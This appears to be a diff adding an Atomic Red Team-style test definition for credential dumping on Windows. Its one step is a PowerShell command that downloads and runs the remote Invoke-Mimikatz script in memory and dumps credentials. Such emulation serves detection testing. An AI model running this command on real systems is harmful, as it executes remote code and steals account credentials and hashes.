@@ -1,0 +1,31 @@
+{
+  "id": "66fb0bc1-3c3f-47e9-a298-550ecfefacbc",
+  "name": "Powershell Mimikatz",
+  "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "da0dd06a-a047-4273-8ea5-d7e7841c9e01",
+      "type": "execute-command",
+      "data": {
+        "command": "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1003.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_script",
+      "type": "url",
+      "description": "URL to a remote Mimikatz script that dumps credentials",
+      "value": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
+    }
+  ]
+}
